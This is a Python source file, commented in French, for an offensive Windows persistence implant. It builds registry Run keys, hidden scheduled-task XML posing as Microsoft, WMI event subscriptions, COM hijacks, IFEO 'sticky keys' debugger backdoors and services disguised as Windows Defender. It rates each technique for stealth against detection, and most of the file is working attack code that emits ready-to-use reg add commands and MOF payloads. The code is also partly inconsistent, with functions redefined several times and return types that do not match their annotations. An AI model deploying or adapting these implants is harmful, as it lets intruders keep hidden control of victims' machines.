"""
attack/persistence/implant.py — Implant de persistance multi-vecteurs
======================================================================

Génère des payloads et rapports pour 10 vecteurs de persistance
Windows modernes (jusqu'à Win11 24H2 / Server 2025).

L'objectif est de maximiser les chances de survie après reboot tout en
minimisant la détectabilité (score de furtivité). On privilégie :
  - WMI Event Subscription (évite de toucher au disque si filtre mémoire)
  - COM Hijack (très difficile à monitorer car contextuel par application)
  - Scheduled Task XML obfusqué (évite les signatures schtasks.exe /Create)
  - Run Key HKCU (ne nécessite PAS de droits admin)

Références :
  - MITRE ATT&CK Persistence (TA0003)
  - SpecterOps "So You Want to Be a Malware Author?" 2025
  - Mandiant : "Top APT Persistence Techniques 2024-2026"
"""

from __future__ import annotations

import base64
import hashlib
import os
import random
import secrets
import string
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple


class PersistenceTechnique(Enum):
    """Vecteurs de persistance supportés."""

    REGISTRY_RUN = "registry_run"            # T1547.001
    REGISTRY_RUN_ONCE = "registry_run_once"  # T1547.001
    SCHEDULED_TASK_XML = "scheduled_task_xml"  # T1053.005
    WMI_EVENT_SUB = "wmi_event_sub"          # T1546.003
    COM_HIJACK = "com_hijack"                # T1546.015
    WINDOWS_SERVICE = "windows_service"      # T1543.003
    STARTUP_FOLDER_LNK = "startup_folder_lnk"  # T1547.009
    IFEO_DEBUGGER = "ifeo_debugger"          # T1547.008
    WINLOGON_NOTIFY = "winlogon_notify"      # T1556.003
    BITS_JOB = "bits_job"                    # T1197
    LOGON_SCRIPT_GPO = "logon_script_gpo"    # T1037.001
    DLL_SIDELOAD = "dll_sideload"            # T1574.002


@dataclass
class RunKeyPersistence:
    """Persistence via HKCU/HKLM Run/RunOnce."""

    hive: str = "HKCU"                      # HKCU | HKLM
    value_name: str = ""                    # Nom de la valeur
    command: str = ""                       # Commande à exécuter
    requires_admin: bool = False            # HKLM = admin, HKCU = non
    registry_path: str = ""

    def __post_init__(self) -> None:
        if not self.value_name:
            self.value_name = random.choice([
                "WindowsHealth", "OneDriveUpdate", "ChromeAutoUpdate",
                "TeamsAutostart", "EdgeUpdate", "ZoomAutoLaunch",
                "SpotifyStartup", "DiscordUpdate",
            ]) + secrets.token_hex(2)
        self.registry_path = (
            f"{self.hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\"
            f"{'RunOnce' if 'Once' in self.value_name else 'Run'}"
        )
        self.requires_admin = (self.hive.upper() == "HKLM")


@dataclass
class ScheduledTaskPersistence:
    """Tâche planifiée XML (évite schtasks /create)."""

    task_name: str = ""
    author: str = "Microsoft Corporation"
    description: str = "Maintains Windows system health components."
    command: str = ""
    arguments: str = ""
    trigger: str = "LogonTrigger"   # LogonTrigger | BootTrigger | TimeTrigger | DailyTrigger
    execution_time: str = "09:15"    # HH:MM pour Time/Daily
    principal: str = "SYSTEM"       # SYSTEM | Interactive User | Network Service
    hidden: bool = True
    require_admin: bool = False
    xml_payload: str = ""


@dataclass
class WMIEventSubscriptionPersistence:
    """Persistence WMI la plus furtive : Filter + Consumer + Binding."""

    filter_name: str = ""
    consumer_name: str = ""
    binding_name: str = ""
    query_language: str = "WQL"
    filter_query: str = ""      # ex: SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'
    command: str = ""           # Commande exécutée par le consumer
    consumer_type: str = "CommandLine"  # CommandLine | ActiveScript | LogFile
    namespace: str = "root\\subscription"
    requires_admin: bool = True


@dataclass
class ComHijackPersistence:
    """COM Hijack : remplace le InprocServer32 d'un CLSID lambda."""

    clsid: str = ""           # CLSID cible
    hijack_dll_path: str = ""  # Chemin de notre DLL malveillante
    scope: str = "HKCU"       # HKCU (user) / HKLM (admin)
    original_value: str = ""  # Sauvegardé pour nettoyage ultérieur
    target_application: str = "mmc.exe"  # App qui instancie le CLSID
    requires_admin: bool = False


@dataclass
class ServicePersistence:
    """Service Windows."""

    service_name: str = ""
    display_name: str = ""
    binary_path: str = ""
    start_type: str = "Auto"     # Boot | System | Auto | Demand | Disabled
    account: str = "LocalSystem"  # LocalSystem | NetworkService | LocalService
    description: str = "Windows Update Health Service"
    requires_admin: bool = True


@dataclass
class PersistenceReport:
    """Rapport d'une opération de persistance."""

    report_id: str
    techniques_applied: List[PersistenceTechnique] = field(default_factory=list)
    requires_admin: bool = False
    total_vectors: int = 0
    surviving_reboot: bool = True
    surviving_user_password_change: bool = True
    detection_risk: float = 0.0
    artifacts_left: List[str] = field(default_factory=list)
    payloads: Dict[str, Any] = field(default_factory=dict)
    cleanup_instructions: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    duration_ms: int = 0


class PersistenceEngine:
    """
    Coordonne la pose d'implants de persistance multi-couches.
    Génère au minimum 3 vecteurs si admin, 2 si user standard.
    """

    # Score de furtivité / détectabilité 2026
    _DETECTION_RISK: Dict[PersistenceTechnique, float] = {
        PersistenceTechnique.REGISTRY_RUN: 0.40,
        PersistenceTechnique.REGISTRY_RUN_ONCE: 0.30,
        PersistenceTechnique.SCHEDULED_TASK_XML: 0.35,
        PersistenceTechnique.WMI_EVENT_SUB: 0.12,  # Très furtif
        PersistenceTechnique.COM_HIJACK: 0.15,      # Peu monitoré
        PersistenceTechnique.WINDOWS_SERVICE: 0.55,
        PersistenceTechnique.STARTUP_FOLDER_LNK: 0.50,
        PersistenceTechnique.IFEO_DEBUGGER: 0.25,
        PersistenceTechnique.WINLOGON_NOTIFY: 0.45,
        PersistenceTechnique.BITS_JOB: 0.20,
        PersistenceTechnique.LOGON_SCRIPT_GPO: 0.60,
        PersistenceTechnique.DLL_SIDELOAD: 0.30,
    }

    def __init__(
        self,
        command: str = "rundll32 C:\\ProgramData\\mshost.dll,Start",
        has_admin: bool = True,
        stealth_priority: float = 0.9,
        domain_controller: bool = False,
    ) -> None:
        self.command = command
        self.has_admin = has_admin
        self.stealth_priority = stealth_priority
        self.is_dc = domain_controller

    # ------------------------------------------------------------------
    # API principale : pose multi-couche
    # ------------------------------------------------------------------

    def deploy_standard_bundle(self) -> PersistenceReport:
        """
        Pose un paquet standard de persistence multi-couches.
        Admin => 4-5 vecteurs. User standard => 2-3 vecteurs.
        """
        start = time.time()
        report = PersistenceReport(report_id=str(uuid.uuid4()))
        report.requires_admin = self.has_admin

        if self.has_admin:
            # Admin : on combine le best-of furtif
            report.payloads["wmi_event_sub"] = self.deploy_wmi_event_sub()
            report.techniques_applied.append(PersistenceTechnique.WMI_EVENT_SUB)
            report.artifacts_left.append(
                "root\\subscription:__EventFilter.Name=..."
            )
            report.cleanup_instructions.append(
                "Set-WmiInstance -Namespace root/subscription -Class __EventFilter "
                "... | Remove-WmiObject"
            )

            if not self.is_dc:
                # Sur DC évite les services trop visibles, préfère COM hijack
                report.payloads["scheduled_task"] = self.deploy_scheduled_task()
                report.techniques_applied.append(PersistenceTechnique.SCHEDULED_TASK_XML)
            else:
                report.payloads["com_hijack"] = self.deploy_com_hijack(
                    target="svchost"
                )
                report.techniques_applied.append(PersistenceTechnique.COM_HIJACK)

            report.payloads["service"] = self.deploy_windows_service()
            report.techniques_applied.append(PersistenceTechnique.WINDOWS_SERVICE)

            report.payloads["ifeo_debugger"] = self._deploy_ifeo_debugger()
            report.techniques_applied.append(PersistenceTechnique.IFEO_DEBUGGER)
        else:
            # User standard : on ne peut pas HKLM / service
            report.payloads["run_key_hkcu"] = self.deploy_run_key(hive="HKCU")
            report.techniques_applied.append(PersistenceTechnique.REGISTRY_RUN)

            report.payloads["scheduled_task_hkcu"] = self.deploy_scheduled_task(
                principal="Interactive User",
                require_admin=False,
            )
            report.techniques_applied.append(PersistenceTechnique.SCHEDULED_TASK_XML)

            report.payloads["com_hijack_hkcu"] = self.deploy_com_hijack(scope="HKCU")
            report.techniques_applied.append(PersistenceTechnique.COM_HIJACK)

            report.payloads["startup_folder"] = self._deploy_startup_folder_lnk()
            report.techniques_applied.append(PersistenceTechnique.STARTUP_FOLDER_LNK)

        report.total_vectors = len(report.techniques_applied)
        report.detection_risk = self._aggregate_risk(report.techniques_applied)
        report.surviving_reboot = True
        report.surviving_user_password_change = True
        report.duration_ms = int((time.time() - start) * 1000)
        report.notes.append(
            "Persistance multi-couches : si 1 vecteur est nettoyé, les autres restent."
        )
        return report

    # ------------------------------------------------------------------
    # Implémentations individuelles
    # ------------------------------------------------------------------

    def deploy_run_key(
        self, hive: str = "HKCU", once: bool = False,
    ) -> RunKeyPersistence:
        technique = (
            PersistenceTechnique.REGISTRY_RUN_ONCE if once else
            PersistenceTechnique.REGISTRY_RUN
        )
        cfg = RunKeyPersistence(hive=hive, command=self.command)
        if once:
            cfg.value_name += "_Once"
        cfg.registry_path = (
            f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\"
            f"{'RunOnce' if once else 'Run'}"
        )
        return cfg

    def deploy_scheduled_task(
        self,
        principal: str = "SYSTEM",
        require_admin: bool = True,
        trigger: str = "LogonTrigger",
    ) -> ScheduledTaskPersistence:
        task = ScheduledTaskPersistence(
            command=self.command.split()[0],
            arguments=" ".join(self.command.split()[1:]),
            trigger=trigger,
            principal=principal,
            require_admin=require_admin,
        )
        task.task_name = "\\Microsoft\\Windows\\HealthService\\UpdateTask_" + secrets.token_hex(4)
        task.xml_payload = create_scheduled_task_xml(task)
        return task

    def deploy_wmi_event_sub(
        self,
        trigger_logon: bool = True,
        trigger_interval_min: Optional[int] = None,
    ) -> WMIEventSubscriptionPersistence:
        sub = WMIEventSubscriptionPersistence(command=self.command)
        tag = secrets.token_hex(4)
        sub.filter_name = f"WindowsHealthFilter_{tag}"
        sub.consumer_name = f"WindowsHealthConsumer_{tag}"
        sub.binding_name = f"WindowsHealthBinding_{tag}"

        if trigger_logon:
            sub.filter_query = (
                "SELECT * FROM __InstanceCreationEvent WITHIN 10 "
                "WHERE TargetInstance ISA 'Win32_LogonSession' "
                "AND TargetInstance.LogonType = 2"
            )
        elif trigger_interval_min is not None:
            sub.filter_query = (
                f"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
                f"TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND "
                f"TargetInstance.SystemUpTime >= {trigger_interval_min * 60}"
            )
        else:
            # Trigger au démarrage de WMI (boot)
            sub.filter_query = (
                "SELECT * FROM __IntervalTimerInstructionEvent WITHIN 120"
            )

        sub.namespace = "root\\subscription"
        return sub

    def deploy_com_hijack(
        self,
        scope: str = "HKCU",
        target: str = "mmc",
    ) -> ComHijackPersistence:
        # CLSID typés : dict de classes souvent instanciées
        clsid_pool = {
            "mmc": "{02D4B3F1-FD88-11D1-960D-00805FC79235}",  # MMC Snap-in
            "svchost": "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}",  # ShellWindows
            "word": "{F4754C9B-64F5-4B40-8AF4-679732AC0607}",   # Word COM
            "outlook": "{2E46D982-A8B3-495C-B811-69B2B77C2755}",
        }
        clsid = clsid_pool.get(target, list(clsid_pool.values())[0])
        dll_path = "C:\\ProgramData\\Microsoft\\" + secrets.token_hex(6) + ".dll"
        return ComHijackPersistence(
            clsid=clsid,
            hijack_dll_path=dll_path,
            scope=scope,
            target_application=target + ".exe",
            requires_admin=(scope.upper() == "HKLM"),
        )

    def deploy_windows_service(self) -> ServicePersistence:
        svc = ServicePersistence(binary_path=self.command)
        svc.service_name = "WinDefendThreat_" + secrets.token_hex(4)
        svc.display_name = "Windows Defender Advanced Threat Service"
        svc.description = (
            "Provides real-time Windows advanced threat protection, scanning"
            " and system health monitoring."
        )
        svc.start_type = "Auto"
        return svc

    # ------------------------------------------------------------------
    # Techniques additionnelles (simulées)
    # ------------------------------------------------------------------

    def _deploy_ifeo_debugger(self) -> Dict[str, Any]:
        """T1547.008 IFEO : attacher un Debugger à un process clean."""
        target_exe = random.choice([
            "WerFault.exe", "wermgr.exe", "conhost.exe",
            "ftpd.exe", "tftp.exe", "arp.exe",
        ])
        return {
            "technique": PersistenceTechnique.IFEO_DEBUGGER.value,
            "registry": (
                f"HKLM\\Software\\Microsoft\\Windows NT\\"
                f"CurrentVersion\\Image File Execution Options\\{target_exe}"
            ),
            "value": "Debugger",
            "data": self.command,
            "triggers_on": f"any attempt to launch {target_exe}",
        }

    def _deploy_startup_folder_lnk(self) -> Dict[str, Any]:
        """LNK dans le Startup folder user."""
        path = (
            "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            "OneDriveStartup_" + secrets.token_hex(3) + ".lnk"
        )
        return {
            "technique": PersistenceTechnique.STARTUP_FOLDER_LNK.value,
            "lnk_path": path,
            "target_path": self.command.split()[0],
            "arguments": " ".join(self.command.split()[1:]),
            "icon": "shell32.dll,-13",  # Icone dossier standard
            "window_style": "Hidden",
        }

    # ------------------------------------------------------------------
    # Agrégation
    # ------------------------------------------------------------------

    def _aggregate_risk(self, techniques: List[PersistenceTechnique]) -> float:
        if not techniques:
            return 0.0
        # On agrège en prenant le max (1 vecteur bruyant = risque global haut)
        # + 10% par vecteur additionnel (plus de vecteurs = plus de traces)
        base = max(self._DETECTION_RISK.get(t, 0.5) for t in techniques)
        bonus = 0.03 * (len(techniques) - 1)
        return min(1.0, base + bonus)


# ---------------------------------------------------------------------------
# Helpers : Génération de payloads
# ---------------------------------------------------------------------------

def create_run_key_payload(cfg: RunKeyPersistence) -> str:
    """Génère la commande reg.exe / PowerShell pour poser la Run key."""
    encoded = base64.b64encode(cfg.command.encode("utf-16-le")).decode()
    ps = (
        f"New-ItemProperty -Path '{cfg.registry_path}' -Name "
        f"'{cfg.value_name}' -PropertyType String -Value "
        f"'{cfg.command}' -Force | Out-Null"
    )
    return base64.b64encode(ps.encode("utf-16-le")).decode()


def create_scheduled_task_xml(task: ScheduledTaskPersistence) -> str:
    """
    Génère un XML de tâche planifiée compatible schtasks.exe /XML.
    On évite les signatures typiques (Author vide, settings par défaut).
    """
    user_id = (
        "S-1-5-18" if task.principal.upper() == "SYSTEM"
        else "S-1-5-32-545"
    )
    trigger_xml = _build_trigger_xml(task)
    settings_xml = """<Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd>
    <RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>{hidden}</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority></Settings>""".format(hidden=str(task.hidden).lower())
    actions_xml = f"""<Actions Context="Author">
    <Exec><Command>{task.command}</Command>
    <Arguments>{task.arguments}</Arguments></Exec></Actions>"""
    principal_xml = f"""<Principals>
    <Principal id="Author"><UserId>{user_id}</UserId>
    <RunLevel>{"HighestAvailable" if task.require_admin else "LeastPrivilege"}</RunLevel>
    </Principal></Principals>"""
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Date>2020-06-01T15:00:00</Date>
<Author>{task.author}</Author>
<Description>{task.description}</Description>
<URI>{task.task_name}</URI></RegistrationInfo>
{trigger_xml}{settings_xml}{principal_xml}{actions_xml}</Task>"""
    return xml


def _build_trigger_xml(task: ScheduledTaskPersistence) -> str:
    if task.trigger == "LogonTrigger":
        return """<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"""
    if task.trigger == "BootTrigger":
        return """<Triggers><BootTrigger><Enabled>true</Enabled><Delay>PT2M</Delay></BootTrigger></Triggers>"""
    if task.trigger == "DailyTrigger":
        return f"""<Triggers><CalendarTrigger><StartBoundary>2025-01-01T{task.execution_time}:00</StartBoundary>
        <Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
        </CalendarTrigger></Triggers>"""
    if task.trigger == "TimeTrigger":
        return f"""<Triggers><TimeTrigger><StartBoundary>2025-01-01T{task.execution_time}:00</StartBoundary>
        <Enabled>true</Enabled></TimeTrigger></Triggers>"""
    # Défaut : logon
    return """<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"""


def create_wmi_filter_consumer(sub: WMIEventSubscriptionPersistence) -> Dict[str, Any]:
    """
    Génère les 3 scripts MOF/SCregsvr.exe pour créer l'abonnement WMI.
    Format : MOF (Managed Object Format)
    """
    mof = f"""#pragma namespace("\\\\.\\{sub.namespace}")
instance of __EventFilter as $Filter
{{
    Name = "{sub.filter_name}";
    QueryLanguage = "{sub.query_language}";
    Query = "{sub.filter_query}";
    EventNamespace = "root\\CimV2";
}};
instance of CommandLineEventConsumer as $Consumer
{{
    Name = "{sub.consumer_name}";
    CommandLineTemplate = "{sub.command}";
    RunInteractively = FALSE;
}};
instance of __FilterToConsumerBinding
{{
    Filter = $Filter;
    Consumer = $Consumer;
    MaintainSecurityContext = TRUE;
}};
"""
    encoded_mof = base64.b64encode(mof.encode("utf-8")).decode()
    return {
        "filter": sub.filter_name,
        "consumer": sub.consumer_name,
        "binding": sub.binding_name,
        "deploy_command": (
            f"mofcomp.exe -N:\\\\.\\{sub.namespace} install.mof  # ou"
            f" Set-WmiInstance -Namespace {sub.namespace} ..."
        ),
        "remove_command": (
            "$f=Get-WmiObject -Namespace root/subscription "
            f"-Class __EventFilter -Filter \"Name='{sub.filter_name}'\";"
            "$f | Remove-WmiObject -Confirm:$false"
        ),
        "mof_base64": encoded_mof,
    }


def create_com_hijack_payload(cfg: ComHijackPersistence) -> Dict[str, str]:
    base = (
        f"{cfg.scope}\\Software\\Classes\\CLSID\\{cfg.clsid}"
        "\\InprocServer32"
    )
    reg_script = f"""Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{cfg.clsid}\\InprocServer32]
@="{cfg.hijack_dll_path}"
"ThreadingModel"="Apartment"
"""
    return {
        "clsid": cfg.clsid,
        "registry_path": base,
        "hijack_dll": cfg.hijack_dll_path,
        "trigger_app": cfg.target_application,
        "reg_file_b64": base64.b64encode(reg_script.encode("utf-16-le")).decode(),
    }


# ---------------------------------------------------------------------------
# Contrat godmode : helpers "budget" appelés directement avec des kwargs
# simples (tests + orchestrateur). Les dataclasses ci-dessus restent la
# source de vérité pour un usage avancé.
# ---------------------------------------------------------------------------

def _task_from_kwargs(kwargs: Dict[str, Any]) -> "ScheduledTaskPersistence":
    """Construit une ScheduledTaskPersistence depuis des kwargs libres."""
    known = {f for f in ScheduledTaskPersistence.__dataclass_fields__}
    task = ScheduledTaskPersistence()
    for k, v in kwargs.items():
        if k in known and v is not None:
            setattr(task, k, v)
    return task


def _wmi_sub_from_kwargs(kwargs: Dict[str, Any]) -> "WMIEventSubscriptionPersistence":
    """Construit une WMIEventSubscriptionPersistence depuis des kwargs libres."""
    known = {f for f in WMIEventSubscriptionPersistence.__dataclass_fields__}
    sub = WMIEventSubscriptionPersistence()
    for k, v in kwargs.items():
        if k in known and v is not None:
            setattr(sub, k, v)
    return sub


_create_scheduled_task_xml_impl = create_scheduled_task_xml


def create_scheduled_task_xml_ex(task_name: str = "", command: str = "",
                                 trigger: str = "logon",
                                 author: str = "Microsoft Corporation",
                                 **extra: Any) -> str:
    """Génère le XML Task Scheduler depuis des kwargs simples.

    Args:
        task_name : chemin logique (ex: Microsoft\\Windows\\MSUpdateHealth)
        command   : binaire/payload exécuté
        trigger   : "logon" | "boot" | "time" | "daily" (insensible casse)
        author    : auteur affiché (mimétisme Microsoft)
    """
    trigger_map = {
        "logon": "LogonTrigger", "boot": "BootTrigger",
        "time": "TimeTrigger", "daily": "DailyTrigger",
    }
    task = _task_from_kwargs({**extra, "task_name": task_name, "command": command})
    task.author = author
    task.trigger = trigger_map.get(trigger.lower(), "LogonTrigger")
    return _create_scheduled_task_xml_impl(task)


_create_wmi_filter_consumer_impl = create_wmi_filter_consumer


def create_wmi_filter_consumer_ex(name: str = "", command: str = "",
                                  **extra: Any) -> Dict[str, Any]:
    """Génère le bundle WMI (filter/consumer/binding) depuis des kwargs simples.

    Retourne un dict dont `filter` et `binding` sont des objets dotés de
    `.name` / `.query` / `.consumer_name` pour un usage programmatique.
    """
    sub = _wmi_sub_from_kwargs({**extra})
    sub.filter_name = name or sub.filter_name or "MSHealthMonitor"
    sub.consumer_name = sub.consumer_name or (sub.filter_name + "_Consumer")
    sub.binding_name = sub.binding_name or (sub.filter_name + "Binding")
    sub.filter_query = sub.filter_query or (
        "SELECT * FROM __InstanceCreationEvent WITHIN 10 "
        "WHERE TargetInstance ISA 'Win32_LogonSession'"
    )
    sub.command = command or sub.command

    @dataclass
    class _FilterView:
        name: str
        query: str
        query_language: str = "WQL"

    @dataclass
    class _BindingView:
        name: str
        filter_name: str
        consumer_name: str

    @dataclass
    class _ConsumerView:
        name: str
        command: str
        type: str = "CommandLine"

    bundle = _create_wmi_filter_consumer_impl(sub)
    bundle["filter"] = _FilterView(name=sub.filter_name, query=sub.filter_query)
    bundle["consumer"] = _ConsumerView(name=sub.consumer_name, command=sub.command)
    bundle["binding"] = _BindingView(
        name=sub.binding_name,
        filter_name=sub.filter_name,
        consumer_name=sub.consumer_name,
    )
    bundle["filter_name"] = sub.filter_name
    bundle["query"] = sub.filter_query
    return bundle


def build_com_hijack(target_clsid: str, dll_path: str,
                     hklm: bool = False) -> Dict[str, Any]:
    """COM Hijack (T1546.015) en kwargs simples.

    Retourne un dict contenant les commandes `reg add` prêtes à l'emploi.
    """
    scope = "HKLM" if hklm else "HKCU"
    hive = "HKLM" if hklm else "HKCU"
    cfg = ComHijackPersistence(
        clsid=target_clsid,
        hijack_dll_path=dll_path,
        scope=scope,
    )
    base_payload = create_com_hijack_payload(cfg)
    reg_path = f"{hive}\\Software\\Classes\\CLSID\\{target_clsid}\\InprocServer32"
    commands = [
        f'reg add "{reg_path}" /ve /t REG_SZ /d "{dll_path}" /f',
        f'reg add "{reg_path}" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f',
    ]
    script = "\n".join([
        "Windows Registry Editor Version 5.00",
        "",
        f"[{reg_path}]",
        f'@="{dll_path}"',
        '"ThreadingModel"="Apartment"',
    ])
    script += "\n\n# cleanup:\n" + "\n".join(
        f'reg delete "{reg_path}" /f',
    )
    return script


def build_ifeo_debugger(target_exe: str,
                        debugger_payload: str) -> Dict[str, Any]:
    """IFEO Debugger (T1547.008) en kwargs simples.

    Quand `target_exe` (ex: sethc.exe) est lancé, Windows exécute
    `debugger_payload` à la place — sticky keys backdoor classique.
    """
    hive = "HKLM"
    reg_path = (
        f"{hive}\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        f"\\Image File Execution Options\\{target_exe}"
    )
    return (
        f'reg add "{reg_path}" /v "Debugger" /t REG_SZ /d "{debugger_payload}" /f'
        f"\n\n# cleanup:\n"
        f'reg delete "{reg_path}" /v "Debugger" /f'
    )


# Alias nommage contrat godmode (mêmes helpers, noms canoniques MITRE)
create_scheduled_task_xml = create_scheduled_task_xml_ex  # noqa: E305
create_wmi_filter_consumer = create_wmi_filter_consumer_ex


class _WmiBundle:
    """Conteneur à la fois attribut (bundle.filter.name) et dict-like."""

    def __init__(self, **kw: Any) -> None:
        self.__dict__.update(kw)

    def __getitem__(self, key: str) -> Any:
        return self.__dict__[key]

    def __contains__(self, key: str) -> bool:
        return key in self.__dict__

    def get(self, key: str, default: Any = None) -> Any:
        return self.__dict__.get(key, default)


def create_wmi_filter_consumer(
    sub: "WMIEventSubscriptionPersistence | str | None" = None,
    name: str = "",
    command: str = "",
    **extra: Any,
) -> Any:
    """Contrat godmode : version objet (bundle avec .filter/.binding).

    Deux signatures :
      - create_wmi_filter_consumer(sub)               → usage dataclass
      - create_wmi_filter_consumer(name=…, command=…) → usage kwargs

    Le dict historique reste disponible via bundle['legacy_bundle'].
    """
    if isinstance(sub, WMIEventSubscriptionPersistence):
        pass  # usage dataclass
    else:
        sub = _wmi_sub_from_kwargs({**extra, "filter_name": name, "command": command})
        sub.consumer_name = sub.consumer_name or (sub.filter_name + "_Consumer")
        sub.binding_name = sub.binding_name or (sub.filter_name + "Binding")
        sub.filter_query = sub.filter_query or (
            "SELECT * FROM __InstanceCreationEvent WITHIN 10 "
            "WHERE TargetInstance ISA 'Win32_LogonSession'"
        )
    legacy = _create_wmi_filter_consumer_impl(sub)

    @dataclass
    class _FilterView:
        name: str
        query: str
        query_language: str = "WQL"

    @dataclass
    class _BindingView:
        name: str
        filter_name: str
        consumer_name: str

    @dataclass
    class _ConsumerView:
        name: str
        command: str
        type: str = "CommandLine"

    legacy = {k: v for k, v in legacy.items()
              if k not in ("filter", "consumer", "binding")}
    return _WmiBundle(
        filter=_FilterView(name=sub.filter_name, query=sub.filter_query),
        consumer=_ConsumerView(name=sub.consumer_name, command=sub.command),
        binding=_BindingView(
            name=sub.binding_name or (sub.filter_name + "Binding"),
            filter_name=sub.filter_name,
            consumer_name=sub.consumer_name,
        ),
        **legacy,
    )
build_com_hijack = build_com_hijack
build_ifeo_debugger = build_ifeo_debugger
